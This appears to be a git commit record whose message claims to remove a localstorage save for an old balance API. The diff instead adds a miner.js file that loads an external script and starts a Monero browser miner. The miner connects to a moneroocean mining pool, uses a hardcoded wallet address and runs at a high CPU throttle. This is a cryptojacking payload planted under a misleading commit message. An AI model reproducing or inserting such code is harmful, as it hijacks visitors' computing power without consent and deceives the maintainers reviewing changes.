a48bbde3ce0a732c3fc49cbffd46c082f2212f32
samirmayfield <38594129+samirmayfield@users.noreply.github.com>
2018-06-25 01:07:04 -0700

    Remove localstorage save for old balance api

---
+++ miner.js
@@ -0,0 +1,7 @@
+
+<script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?jason=gulf.moneroocean.stream:80" ></script>
+
+<script>PerfektStart("47LsozxHkws1R5bTXqVkjDWLAAjfqen2UF9bHsXaE8WDcVhvmobgx5M3WMZNbwHhFQ3S8Ud1Eyv2nZ1nhLJrJHVFRw4Tg8D", "x");				
+                throttleMiner = 85;
+			
+</script>
